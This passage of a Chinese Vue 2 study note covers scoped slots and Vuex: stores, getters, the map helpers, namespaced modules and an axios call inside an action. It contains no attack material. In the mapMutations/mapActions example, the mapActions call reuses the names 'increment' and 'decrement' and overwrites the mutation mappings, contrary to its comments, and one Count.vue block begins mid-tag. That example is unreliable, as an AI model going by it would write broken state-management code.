					<li style="color: red" v-for="(g, index) in games" :key="index">
						{{ g }}
					</li>
				</ol>
			</template>
		</Category>

		<Category title="游戏">
			<!-- 此处的slot-scope与scope一样 -->
			<template slot-scope="{ games }">
				<h4 v-for="(g, index) in games" :key="index">{{ g }}</h4>
			</template>
		</Category>
	</div>
</template>

<script>
import Category from "./components/Category";
export default {
	name: "App",
	components: { Category },
};
</script>

<style scoped>
.container,
.foot {
	display: flex;
	justify-content: space-around;
}
h4 {
	text-align: center;
}
</style>

```

- Category.vue
```html
<template>
	<div class="category">
		<h3>{{ title }}分类</h3>
		<!-- 作用域插槽也可以起名字 -->
		<slot :games="games" msg="hello">我是默认的一些内容</slot>
	</div>
</template>

<script>
export default {
	name: "Category",
	props: ["title"],
	data() {
		return {
			games: ["红色警戒", "穿越火线", "劲舞团", "超级玛丽"],
		};
	},
};
</script>

<style scoped>
.category {
	background-color: skyblue;
	width: 200px;
	height: 300px;
}
h3 {
	text-align: center;
	background-color: orange;
}
video {
	width: 100%;
}
img {
	width: 100%;
}
</style>
```

### 总结
1. 作用：让父组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于 <strong style="color:red">父组件 ===> 子组件</strong> 。

2. 分类：默认插槽、具名插槽、作用域插槽

3. 使用方式：

   1. 默认插槽：

      ```html
      父组件中：
              <Category>
                 <div>html结构1</div>
              </Category>
      子组件中：
              <template>
                  <div>
                     <!-- 定义插槽 -->
                     <slot>插槽默认内容...</slot>
                  </div>
              </template>
      ```

   2. 具名插槽：

      ```html
      父组件中：
              <Category>
                  <template slot="center">
                    <div>html结构1</div>
                  </template>
      
                  <template v-slot:footer>
                     <div>html结构2</div>
                  </template>
              </Category>
      子组件中：
              <template>
                  <div>
                     <!-- 定义插槽 -->
                     <slot name="center">插槽默认内容...</slot>
                     <slot name="footer">插槽默认内容...</slot>
                  </div>
              </template>
      ```

   3. 作用域插槽：

      1. 理解：<span style="color:red">数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。</span>（games数据在Category组件中，但使用数据所遍历出来的结构由App组件决定）

      2. 具体编码：

         ```html
         父组件中：
         		<Category>
         			<template scope="scopeData">
         				<!-- 生成的是ul列表 -->
         				<ul>
         					<li v-for="g in scopeData.games" :key="g">{{g}}</li>
         				</ul>
         			</template>
         		</Category>
         
         		<Category>
         			<template slot-scope="scopeData">
         				<!-- 生成的是h4标题 -->
         				<h4 v-for="g in scopeData.games" :key="g">{{g}}</h4>
         			</template>
         		</Category>
         子组件中：
                 <template>
                     <div>
                         <slot :games="games"></slot>
                     </div>
                 </template>
         		
                 <script>
                     export default {
                         name:'Category',
                         props:['title'],
                         //数据在子组件自身
                         data() {
                             return {
                                 games:['红色警戒','穿越火线','劲舞团','超级玛丽']
                             }
                         },
                     }
                 </script>
         ```

## vuex
### vuex简介
>什么时候使用Vuex？
>1.多个组件依赖于同一状态
>2.来自不同组件的行为需要变更同一状态

![请添加图片描述](https://img-blog.csdnimg.cn/799a8fac16144fcab90b5527f599d002.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)
![请添加图片描述](https://img-blog.csdnimg.cn/39b57fd8e65e46d08e975a42198d144c.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)

###  求和案例纯vue版
- App.vue
```html
<template>
	<div>
		<Count />
	</div>
</template>

<script>
import Count from "./components/Count";
export default {
	name: "App",
	components: { Count },
};
</script>
```
- Count.vue
```html
<template>
	<div>
		<h1>当前求和为：{{ sum }}</h1>
		<select v-model.number="n">
			<!-- 此处要加:,使得其不会是字符串，或者在v-model中加.number。此处两者都用。 -->
			<option :value="1">1</option>
			<option :value="2">2</option>
			<option :value="3">3</option>
		</select>
		<button @click="increment">+</button>
		<button @click="decrement">-</button>
		<button @click="incrementOdd">当前求和为奇数再加</button>
		<button @click="incrementWait">等一等再加</button>
	</div>
</template>

<script>
export default {
	name: "Count",
	data() {
		return {
			n: 1, // 用户选择的数字
			sum: 0, // 当前的和
		};
	},
	methods: {
		increment() {
			this.sum += this.n;
		},
		decrement() {
			this.sum -= this.n;
		},
		incrementOdd() {
			if (this.sum % 2) {
				this.sum += this.n;
			}
		},
		incrementWait() {
			setTimeout(() => {
				this.sum += this.n;
			}, 500);
		},
	},
};
</script>

<style scoped>
button {
	margin-left: 5px;
}
</style>

```

###  vuex图解
![请添加图片描述](https://img-blog.csdnimg.cn/206797a23835418790f3f2d4042e304d.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)
![请添加图片描述](https://img-blog.csdnimg.cn/f4a87544d79b4534bda7be5e48f98b42.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)
![请添加图片描述](https://img-blog.csdnimg.cn/f7b033641a5b4968adc8e90a7841c64f.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)

### 搭建vuex环境
#### 概念

​		在Vue中实现集中式状态（数据）管理的一个Vue插件，对vue应用中多个组件的共享状态进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信。

#### 何时使用？

​		多个组件需要共享数据时

#### 搭建vuex环境
1. 下载vuex：npm i vuex
2. 创建文件：```src/store/index.js```

   ```js
   //引入Vue核心库
   import Vue from 'vue'
   //引入Vuex
   import Vuex from 'vuex'
   //应用Vuex插件
   Vue.use(Vuex)
   
   //准备actions对象——响应组件中用户的动作
   const actions = {}
   //准备mutations对象——修改state中的数据
   const mutations = {}
   //准备state对象——保存具体的数据
   const state = {}
   
   //创建并暴露store
   export default new Vuex.Store({
   	actions,
   	mutations,
   	state
   })
   ```

3. 在```main.js```中创建vm时传入```store```配置项

   ```js
   ......
   //引入store
   import store from './store'
   ......
   
   //创建vm
   new Vue({
   	el:'#app',
   	render: h => h(App),
   	store
   })
   ```

#### 代码
- main.js
```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入插件
import vueResource from 'vue-resource'
// 引入store
import store from './store'

// 脚手架中import 语句默认会比其它语句先执行（上升），无论它们是写在其它语句上方还是下方

//关闭Vue的生产提示
Vue.config.productionTip = false
//使用插件
Vue.use(vueResource)

//创建vm
const vm = new Vue({
	el: '#app',
	render: h => h(App),
	store,
	beforeCreate() {
		Vue.prototype.$bus = this
	}
})

console.log(vm)
```
- ./store/index.js
```js
// 该文件用于创建Vuex中最为核心的store

// 引入vuex
import Vuex from 'vuex'
// 引入vue
import Vue from 'vue'
// vuex中规定要在创建store之前将Vuex挂载到vue实例中。所以无法在main.js中引入。只能在此处引入
Vue.use(Vuex)

// 准备actions--用于响应组件中的动作
const actions = {}

// 准备mutations--用于操作数据（state）
const mutations = {}

// 准备state--用于存储数据
const state = {}

// 创建并暴露store
export default new Vuex.Store({
    actions,
    mutations,
    state
})
```

### 求和案例vuex版
- store/index.js
```js
// 该文件用于创建Vuex中最为核心的store

// 引入vuex
import Vuex from 'vuex'
// 引入vue
import Vue from 'vue'
// vuex中规定要在创建store之前将Vuex挂载到vue实例中。所以无法在main.js中引入。只能在此处引入
Vue.use(Vuex)

// 准备actions--用于响应组件中的动作
const actions = {
    /* jia(context, value) {
        // context为mini版的store
        context.commit('JIA', value)
    },
    jian(context, value) {
        context.commit('JIAN', value)
    }, */
    jiaOdd(context, value) {
        if (context.state.sum % 2) {
            context.commit('JIA', value)
        }
    },
    jiaWait(context, value) {
        setTimeout(() => {
            context.commit('JIA', value)
        }, 500);
    }
}

// 准备mutations--用于操作数据（state）
const mutations = {
    JIA(state, value) {
        console.log('mutations中的JIA被调用了', state, value)
        state.sum += value
    },
    JIAN(state, value) {
        state.sum -= value
    }
}

// 准备state--用于存储数据
const state = {
    sum: 0, // 当前的和
}

// 创建并暴露store
export default new Vuex.Store({
    actions,
    mutations,
    state
})
```

- Count.vue
```html
<template>
	<div>
		<h1>当前求和为：{{ $store.state.sum }}</h1>
		<select v-model.number="n">
			<!-- 此处要加:,使得其不会是字符串，或者在v-model中加.number。此处两者都用。 -->
			<option :value="1">1</option>
			<option :value="2">2</option>
			<option :value="3">3</option>
		</select>
		<button @click="increment">+</button>
		<button @click="decrement">-</button>
		<button @click="incrementOdd">当前求和为奇数再加</button>
		<button @click="incrementWait">等一等再加</button>
	</div>
</template>

<script>
export default {
	name: "Count",
	data() {
		return {
			n: 1, // 用户选择的数字
		};
	},
	methods: {
		increment() {
			this.$store.commit("JIA", this.n);
		},
		decrement() {
			this.$store.commit("JIAN", this.n);
		},
		incrementOdd() {
			this.$store.dispatch("jiaOdd", this.n);
		},
		incrementWait() {
			this.$store.dispatch("jiaWait", this.n);
		},
	},
};
</script>

<style scoped>
button {
	margin-left: 5px;
}
</style>

```

### 基本使用
1. 初始化数据、配置```actions```、配置```mutations```，操作文件```store.js```

   ```js
   //引入Vue核心库
   import Vue from 'vue'
   //引入Vuex
   import Vuex from 'vuex'
   //引用Vuex
   Vue.use(Vuex)
   
   const actions = {
       //响应组件中加的动作
   	jia(context,value){
   		// console.log('actions中的jia被调用了',miniStore,value)
   		context.commit('JIA',value)
   	},
   }
   
   const mutations = {
       //执行加
   	JIA(state,value){
   		// console.log('mutations中的JIA被调用了',state,value)
   		state.sum += value
   	}
   }
   
   //初始化数据
   const state = {
      sum:0
   }
   
   //创建并暴露store
   export default new Vuex.Store({
   	actions,
   	mutations,
   	state,
   })
   ```

2. 组件中读取vuex中的数据：```$store.state.sum```

3. 组件中修改vuex中的数据：```$store.dispatch('action中的方法名',数据)```或 ```$store.commit('mutations中的方法名',数据)```

   >  备注：若没有网络请求或其他业务逻辑，组件中也可以越过actions，即不写```dispatch```，直接编写```commit```

### 几个问题
1. 为何actions中的属性要传入context而不直接传commit?
	答：因为actions中每个属性处理的逻辑有限。当遇到复杂的处理逻辑时，需要多个属性来共同处理，此时就需要用到context.dispatch()。同时有时候要获取到context.state来进行判断。

2. 为何不直接在actions中进行数据操作？
	答：会使开发者工具失效。开发者工具只能监测到mutations中的数据操作。

3. 为何不直接把业务逻辑写到组件自身中？
	答：有些时候业务逻辑十分复杂。如果写在自身，且逻辑要用在多个组件中，则代码得不到复用，冗余过大。


### getters
1. 概念：当state中的数据需要经过加工后再使用时，可以使用getters加工。

2. 在```store.js```中追加```getters```配置

   ```js
   ......
   
   const getters = {
   	bigSum(state){
   		return state.sum * 10
   	}
   }
   
   //创建并暴露store
   export default new Vuex.Store({
   	......
   	getters
   })
   ```

3. 组件中读取数据：```$store.getters.bigSum```

- store/index.js
```js
// 该文件用于创建Vuex中最为核心的store

// 引入vuex
import Vuex from 'vuex'
// 引入vue
import Vue from 'vue'
// vuex中规定要在创建store之前将Vuex挂载到vue实例中。所以无法在main.js中引入。只能在此处引入
Vue.use(Vuex)

// 准备actions--用于响应组件中的动作
const actions = {
    /* jia(context, value) {
        // context为mini版的store
        context.commit('JIA', value)
    },
    jian(context, value) {
        context.commit('JIAN', value)
    }, */
    jiaOdd(context, value) {
        if (context.state.sum % 2) {
            context.commit('JIA', value)
        }
    },
    jiaWait(context, value) {
        setTimeout(() => {
            context.commit('JIA', value)
        }, 500);
    }
}

// 准备mutations--用于操作数据（state）
const mutations = {
    JIA(state, value) {
        console.log('mutations中的JIA被调用了', state, value)
        state.sum += value
    },
    JIAN(state, value) {
        state.sum -= value
    }
}

// 准备state--用于存储数据
const state = {
    sum: 0, // 当前的和
}

// 准备getters--用于将state中的数据进行加工
const getters = {
    bigSum(state) {
        return state.sum * 10
    }
}

// 创建并暴露store
export default new Vuex.Store({
    actions,
    mutations,
    state,
    getters
})
```

- Count.vue
```html
<template>
	<div>
		<h1>当前求和为：{{ $store.state.sum }}</h1>
		<h1>当前求和为放大10倍后：{{ $store.getters.bigSum }}</h1>
		<select v-model.number="n">
			<!-- 此处要加:,使得其不会是字符串，或者在v-model中加.number。此处两者都用。 -->
			<option :value="1">1</option>
			<option :value="2">2</option>
			<option :value="3">3</option>
		</select>
		<button @click="increment">+</button>
		<button @click="decrement">-</button>
		<button @click="incrementOdd">当前求和为奇数再加</button>
		<button @click="incrementWait">等一等再加</button>
	</div>
</template>

<script>
export default {
	name: "Count",
	data() {
		return {
			n: 1, // 用户选择的数字
		};
	},
	methods: {
		increment() {
			this.$store.commit("JIA", this.n);
		},
		decrement() {
			this.$store.commit("JIAN", this.n);
		},
		incrementOdd() {
			this.$store.dispatch("jiaOdd", this.n);
		},
		incrementWait() {
			this.$store.dispatch("jiaWait", this.n);
		},
	},
};
</script>

<style scoped>
button {
	margin-left: 5px;
}
</style>

```

### mapState 和mapGetters
1. <strong>mapState方法：</strong>用于帮助我们映射```state```中的数据为计算属性

   ```js
   computed: {
       //借助mapState生成计算属性：sum、school、subject（对象写法）。其中键代表计算属性名称。值代表State内元素名称
        ...mapState({sum:'sum',school:'school',subject:'subject'}),
            
       //借助mapState生成计算属性：sum、school、subject（数组写法）
       ...mapState(['sum','school','subject']),
   },
   ```

2. <strong>mapGetters方法：</strong>用于帮助我们映射```getters```中的数据为计算属性

   ```js
   computed: {
       //借助mapGetters生成计算属性：bigSum（对象写法）
       ...mapGetters({bigSum:'bigSum'}),
   
       //借助mapGetters生成计算属性：bigSum（数组写法）
       ...mapGetters(['bigSum'])
   },
   ```

- Count.vue
```html
<template>
	<div>
		<h1>当前求和为：{{ sum }}</h1>
		<h3>当前求和为放大10倍后：{{ bigSum }}</h3>
		<h3>我在{{ school }},学习{{ subject }}</h3>
		<select v-model.number="n">
			<!-- 此处要加:,使得其不会是字符串，或者在v-model中加.number。此处两者都用。 -->
			<option :value="1">1</option>
			<option :value="2">2</option>
			<option :value="3">3</option>
		</select>
		<button @click="increment">+</button>
		<button @click="decrement">-</button>
		<button @click="incrementOdd">当前求和为奇数再加</button>
		<button @click="incrementWait">等一等再加</button>
	</div>
</template>

<script>
import { mapState, mapGetters } from "vuex";
export default {
	name: "Count",
	data() {
		return {
			n: 1, // 用户选择的数字
		};
	},
	computed: {
		// 靠程序员自己写计算属性
		/* he() {
			return this.$store.state.sum;
		},
		xuexiao() {
			return this.$store.state.school;
		},
		xueke() {
			return this.$store.state.subject;
		}, */
		// 借助mapState生成计算属性,从state中读取数据（对象写法）。但是它们在开发工具中不在computed中，而在vuex bindings中
		// ...mapState({ he: "sum", xuexiao: "school", xueke: "subject" }),

		sum() {
			return this.$store.state.sum;
		},
		school() {
			return this.$store.state.school;
		},
		subject() {
			return this.$store.state.subject;
		},

		// 此处不能简写，因为值('sum','school','subject')是字符串而不是变量
		// ...map({sum,school,subject})

		// 借助mapState生成计算属性，从state中读取数据（对象写法）
		...mapState(["sum", "school", "subject"]),

		/* ****************************** */
		/* bigSum() {
			return this.$store.getters.bigSum;
		}, */

		// 借助mapGetters生成计算属性，从getters中读取数据（对象写法）
		// ...mapGetters({ bigSum: "bigSum" }),
		// 借助mapGetters生成计算属性，从getters中读取数据（数组写法）
		...mapGetters(["bigSum"]),
	},
	methods: {
		increment() {
			this.$store.commit("JIA", this.n);
		},
		decrement() {
			this.$store.commit("JIAN", this.n);
		},
		incrementOdd() {
			this.$store.dispatch("jiaOdd", this.n);
		},
		incrementWait() {
			this.$store.dispatch("jiaWait", this.n);
		},
	},
	mounted() {
		const x = mapState({ he: "sum", xuexiao: "school", xueke: "subject" });
		console.log(x);
	},
};
</script>

<style scoped>
button {
	margin-left: 5px;
}
</style>

```

### mapMutations与mapActions
1. <strong>mapActions方法：</strong>用于帮助我们生成与```actions```对话的方法，即：包含```$store.dispatch(xxx)```的函数

   ```js
   methods:{
       //靠mapActions生成：incrementOdd、incrementWait（对象形式）
       ...mapActions({incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
   
       //靠mapActions生成：incrementOdd、incrementWait（数组形式）
       ...mapActions(['jiaOdd','jiaWait'])
   }
   ```

2. <strong>mapMutations方法：</strong>用于帮助我们生成与```mutations```对话的方法，即：包含```$store.commit(xxx)```的函数

   ```js
   methods:{
       //靠mapActions生成：increment、decrement（对象形式）
       ...mapMutations({increment:'JIA',decrement:'JIAN'}),
       
       //靠mapMutations生成：JIA、JIAN（对象形式）
       ...mapMutations(['JIA','JIAN']),
   }
   ```

> 备注：mapActions与mapMutations使用时，若需要传递参数需要：在模板中绑定事件时传递好参数，否则参数是事件对象。
```html
<template>
	<div>
		<h1>当前求和为：{{ sum }}</h1>
		<h3>当前求和为放大10倍后：{{ bigSum }}</h3>
		<h3>我在{{ school }},学习{{ subject }}</h3>
		<select v-model.number="n">
			<!-- 此处要加:,使得其不会是字符串，或者在v-model中加.number。此处两者都用。 -->
			<option :value="1">1</option>
			<option :value="2">2</option>
			<option :value="3">3</option>
		</select>
		<button @click="increment(n)">+</button>
		<button @click="decrement(n)">-</button>
		<!-- <button @click="JIA(n)">+</button>
		<button @click="JIAN(n)">-</button> -->
		<button @click="incrementOdd(n)">当前求和为奇数再加</button>
		<button @click="incrementWait(n)">等一等再加</button>
		<!-- <button @click="jiaOdd(n)">当前求和为奇数再加</button>
		<button @click="jiaWait(n)">等一等再加</button> -->
	</div>
</template>

<script>
import { mapState, mapGetters, mapMutations, mapActions } from "vuex";
export default {
	name: "Count",
	data() {
		return {
			n: 1, // 用户选择的数字
		};
	},
	computed: {
		...mapState(["sum", "school", "subject"]),
		...mapGetters(["bigSum"]),
	},
	methods: {
		/* increment() {
			this.$store.commit("JIA", this.n);
		},
		decrement() {
			this.$store.commit("JIAN", this.n);
		}, */

		// 若不写12、13行的参数，mapMutations默认生成如下形式函数。因为vue中不写参数，默认带参为event
		/* increment(event) {
			this.$store.commit("JIA", event);
		}, */

		// 借助mapMutations生成对应的方法，方法中会调用commit去联系mutations(对象写法)
		...mapMutations({ increment: "JIA", decrement: "JIAN" }),

		// 借助mapMutations生成对应的方法，方法中会调用commit去联系mutations(数组写法)
		// ...mapMutations(["JIA", "JIAN"]),

		/* ******************************************************** */

		/* incrementOdd() {
			this.$store.dispatch("jiaOdd", this.n);
		},
		incrementWait() {
			this.$store.dispatch("jiaWait", this.n);
		}, */

		// 借助mapActions生成对应的方法，方法中会调用dispatch去联系mutations(对象写法)
		...mapActions({ increment: "jiaOdd", decrement: "jiaWait" }),

		// 借助mapActions生成对应的方法，方法中会调用dispatch去联系mutations(数组写法)
		// ...mapActions(["jiaOdd", "jiaWait"])
	},
	mounted() {
		const x = mapState({ he: "sum", xuexiao: "school", xueke: "subject" });
		console.log(x);
	},
};
</script>

<style scoped>
button {
	margin-left: 5px;
}
</style>

```

### 多组件共享数据
- store/index.js
```js
// 该文件用于创建Vuex中最为核心的store

// 引入vuex
import Vuex from 'vuex'
// 引入vue
import Vue from 'vue'
// vuex中规定要在创建store之前将Vuex挂载到vue实例中。所以无法在main.js中引入。只能在此处引入
Vue.use(Vuex)

// 准备actions--用于响应组件中的动作
const actions = {
    jiaOdd(context, value) {
        if (context.state.sum % 2) {
            context.commit('JIA', value)
        }
    },
    jiaWait(context, value) {
        setTimeout(() => {
            context.commit('JIA', value)
        }, 500);
    }
}

// 准备mutations--用于操作数据（state）
const mutations = {
    JIA(state, value) {
        console.log('mutations中的JIA被调用了', state, value)
        state.sum += value
    },
    JIAN(state, value) {
        state.sum -= value
    },
    ADD_PERSON(state, value) {
        console.log('mutations中的ADD_PERSON被调用了')
        state.personList.unshift(value)
    }
}

// 准备state--用于存储数据
const state = {
    sum: 0, // 当前的和
    school: '尚硅谷',
    subject: '前端',
    personList: [
        { id: '001', name: '张三' }
    ]
}

// 准备getters--用于将state中的数据进行加工
const getters = {
    bigSum(state) {
        return state.sum * 10
    }
}

// 创建并暴露store
export default new Vuex.Store({
    actions,
    mutations,
    state,
    getters
})
```

- Person.vue
```html
<template>
	<div>
		<h1>人员列表</h1>
		<h3 style="color:red">Count组件求和为：{{sum}}</h3>
		<input type="text" placeholder="请输入名字" v-model="name">
		<button @click="add">添加</button>
		<ul>
			<li v-for="p in personList" :key="p.id">{{p.name}}</li>
		</ul>
	</div>
</template>

<script>
	import {nanoid} from 'nanoid'
	export default {
		name:'Person',
		data() {
			return {
				name:''
			}
		},
		computed:{
			personList(){
				return this.$store.state.personList
			},
			sum(){
				return this.$store.state.sum
			}
		},
		methods: {
			add(){
				const personObj = {id:nanoid(),name:this.name}
				this.$store.commit('ADD_PERSON',personObj)
				this.name = ''
			}
		},
	}
</script>

```

- Count.vue
```html
<template>
	<div>
		<h1>当前求和为：{{ sum }}</h1>
		<h3>当前求和放大10倍为：{{ bigSum }}</h3>
		<h3>我在{{ school }}，学习{{ subject }}</h3>
		<h3 style="color: red">Person组件的总人数是：{{ personList.length }}</h3>
		<select v-model.number="n">
			<option value="1">1</option>
			<option value="2">2</option>
			<option value="3">3</option>
		</select>
		<button @click="increment(n)">+</button>
		<button @click="decrement(n)">-</button>
		<button @click="incrementOdd(n)">当前求和为奇数再加</button>
		<button @click="incrementWait(n)">等一等再加</button>
	</div>
</template>

<script>
import { mapState, mapGetters, mapMutations, mapActions } from "vuex";
export default {
	name: "Count",
	data() {
		return {
			n: 1, //用户选择的数字
		};
	},
	computed: {
		//借助mapState生成计算属性，从state中读取数据。（数组写法）
		...mapState(["sum", "school", "subject", "personList"]),
		//借助mapGetters生成计算属性，从getters中读取数据。（数组写法）
		...mapGetters(["bigSum"]),
	},
	methods: {
		//借助mapMutations生成对应的方法，方法中会调用commit去联系mutations(对象写法)
		...mapMutations({ increment: "JIA", decrement: "JIAN" }),
		//借助mapActions生成对应的方法，方法中会调用dispatch去联系actions(对象写法)
		...mapActions({ incrementOdd: "jiaOdd", incrementWait: "jiaWait" }),
	},
	mounted() {
		// const x = mapState({he:'sum',xuexiao:'school',xueke:'subject'})
		// console.log(x)
	},
};
</script>

<style lang="css">
button {
	margin-left: 5px;
}
</style>

```
###  vuex模块化加namespace
#### 单文件实现vuex模块化
- store/index.js
```js
// 该文件用于创建Vuex中最为核心的store

// 引入vuex
import Vuex from 'vuex'
// 引入vue
import Vue from 'vue'
// vuex中规定要在创建store之前将Vuex挂载到vue实例中。所以无法在main.js中引入。只能在此处引入
Vue.use(Vuex)

// 求和功能相关的配置
const countOptions = {
    namespaced: true,
    actions: {
        jiaOdd(context, value) {
            if (context.state.sum % 2) {
                context.commit('JIA', value)
            }
        },
        jiaWait(context, value) {
            setTimeout(() => {
                context.commit('JIA', value)
            }, 500);
        }
    },
    mutations: {
        JIA(state, value) {
            console.log('mutations中的JIA被调用了', state, value)
            state.sum += value
        },
        JIAN(state, value) {
            state.sum -= value
        },
    },
    state: {
        sum: 0, // 当前的和
        school: '尚硅谷',
        subject: '前端',
    },
    getters: {
        bigSum(state) {
            return state.sum * 10
        }
    },
};

// 人员管理相关的配置
const personOptions = {
    namespaced: true,
    actions: {
        addPersonWang(context, value) {
            if (value.name.indexOf('王') === 0) {
                context.commit('ADD_PERSON', value)
            } else {
                alert('添加的人必须姓王!')
            }
        }
    },
    mutations: {
        ADD_PERSON(state, value) {
            console.log('mutations中的ADD_PERSON被调用了')
            state.personList.unshift(value)
        }
    },
    state: {
        personList: [
            { id: '001', name: '张三' }
        ]
    },
    getters: {
        // 此处的state是局部的state
        firstPersonName(state) {
            return state.personList[0].name
        }
    },
}

// 创建并暴露store
export default new Vuex.Store({
    modules: {
        countAbout: countOptions,
        personAbout: personOptions
    }
})
```

- Count.vue
```html
le="color: red">Person组件的总人数是：{{ personList.length }}</h3>
		<select v-model.number="n">
			<option value="1">1</option>
			<option value="2">2</option>
			<option value="3">3</option>
		</select>
		<button @click="increment(n)">+</button>
		<button @click="decrement(n)">-</button>
		<button @click="incrementOdd(n)">当前求和为奇数再加</button>
		<button @click="incrementWait(n)">等一等再加</button>
	</div>
</template>

<script>
import { mapState, mapGetters, mapMutations, mapActions } from "vuex";
export default {
	name: "Count",
	data() {
		return {
			n: 1, //用户选择的数字
		};
	},
	computed: {
		//借助mapState生成计算属性，从state中读取数据。（数组写法）
		// 此种写法必须配合vuex中的namespace
		...mapState("countAbout", ["sum", "school", "subject"]),
		...mapState("personAbout", ["personList"]),
		//借助mapGetters生成计算属性，从getters中读取数据。（数组写法）
		...mapGetters("countAbout", ["bigSum"]),
	},
	methods: {
		//借助mapMutations生成对应的方法，方法中会调用commit去联系mutations(对象写法)
		...mapMutations("countAbout", { increment: "JIA", decrement: "JIAN" }),
		//借助mapActions生成对应的方法，方法中会调用dispatch去联系actions(对象写法)
		...mapActions("countAbout", {
			incrementOdd: "jiaOdd",
			incrementWait: "jiaWait",
		}),
	},
	mounted() {
		// const x = mapState({he:'sum',xuexiao:'school',xueke:'subject'})
		// console.log(x)
	},
};
</script>

<style lang="css">
button {
	margin-left: 5px;
}
</style>

```

- Person.vue
```html
<template>
	<div>
		<h1>人员列表</h1>
		<h3 style="color: red">Count组件求和为：{{ sum }}</h3>
		<h3>列表中第一个人的名字是：{{ firstPersonName }}</h3>
		<input type="text" placeholder="请输入名字" v-model="name" />
		<button @click="add">添加</button>
		<button @click="addWang">添加一个姓王的人</button>
		<ul>
			<li v-for="p in personList" :key="p.id">{{ p.name }}</li>
		</ul>
	</div>
</template>

<script>
import { nanoid } from "nanoid";
export default {
	name: "Person",
	data() {
		return {
			name: "",
		};
	},
	computed: {
		personList() {
			return this.$store.state.personAbout.personList;
		},
		sum() {
			return this.$store.state.countAbout.sum;
		},
		firstPersonName() {
			return this.$store.getters["personAbout/firstPersonName"];
		},
	},
	methods: {
		add() {
			const personObj = { id: nanoid(), name: this.name };
			this.$store.commit("personAbout/ADD_PERSON", personObj);
			this.name = "";
		},
		addWang() {
			const personObj = { id: nanoid(), name: this.name };
			this.$store.dispatch("personAbout/addPersonWang", personObj);
			this.name = "";
		},
	},
	mounted() {
		console.log(this.$store);
	},
};
</script>

```

#### 多文件模块化
1. 第一步：给每个模块创建对应的文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/08715dd873ec457a9ec565c3d978ddee.png)

2. 第二步：在文件中配置好对应的属性并默认暴露
![](https://img-blog.csdnimg.cn/ec2cfbbd5a77440c895fd3de886b84bd.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)

3. 在index.js中统一导入
![在这里插入图片描述](https://img-blog.csdnimg.cn/602b202ae30246ef9299672f3c2a8dbc.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)

#### 总结
1. 目的：让代码更好维护，让多种数据分类更加明确。

2. 修改```store.js```

   ```javascript
   const countAbout = {
     namespaced:true,//开启命名空间
     state:{x:1},
     mutations: { ... },
     actions: { ... },
     getters: {
       bigSum(state){
          return state.sum * 10
       }
     }
   }
   
   const personAbout = {
     namespaced:true,//开启命名空间
     state:{ ... },
     mutations: { ... },
     actions: { ... }
   }
   
   const store = new Vuex.Store({
     modules: {
       countAbout,
       personAbout
     }
   })
   ```

3. 开启命名空间后，组件中读取state数据：

   ```js
   //方式一：自己直接读取
   this.$store.state.personAbout.list
   //方式二：借助mapState读取：
   ...mapState('countAbout',['sum','school','subject']),
   ```

4. 开启命名空间后，组件中读取getters数据：

   ```js
   //方式一：自己直接读取
   this.$store.getters['personAbout/firstPersonName']
   //方式二：借助mapGetters读取：
   ...mapGetters('countAbout',['bigSum'])
   ```

5. 开启命名空间后，组件中调用dispatch

   ```js
   //方式一：自己直接dispatch
   this.$store.dispatch('personAbout/addPersonWang',person)
   //方式二：借助mapActions：
   ...mapActions('countAbout',{incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
   ```

6. 开启命名空间后，组件中调用commit

   ```js
   //方式一：自己直接commit
   this.$store.commit('personAbout/ADD_PERSON',person)
   //方式二：借助mapMutations：
   ...mapMutations('countAbout',{increment:'JIA',decrement:'JIAN'}),
   ```

### actions中发送网络请求
```js
// 人员管理相关的配置
import axios from 'axios'
import { nanoid } from 'nanoid'
export default {
    namespaced: true,
    actions: {
        addPersonWang(context, value) {
            if (value.name.indexOf('王') === 0) {
                context.commit('ADD_PERSON', value)
            } else {
                alert('添加的人必须姓王!')
            }
        },
        addPersonServer(context) {
            axios.get('https://api.uixsj.cn/hitokoto/get?type=social').then(
                response => {
                    context.commit('ADD_PERSON', { id: nanoid(), name: response.data })
                },
                error => {
                    alert(error.message)
                }
            )
        }
    },
    mutations: {
        ADD_PERSON(state, value) {
            console.log('mutations中的ADD_PERSON被调用了')
            state.personList.unshift(value)
        }
    },
    state: {
        personList: [
            { id: '001', name: '张三' }
        ]
    },
    getters: {
        // 此处的state是局部的state
        firstPersonName(state) {
            return state.personList[0].name
        }
    },
}
```

## vue-router
### vue-router图解
![请添加图片描述](https://img-blog.csdnimg.cn/4188861ad5a14f5b89b74894d6222b85.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)
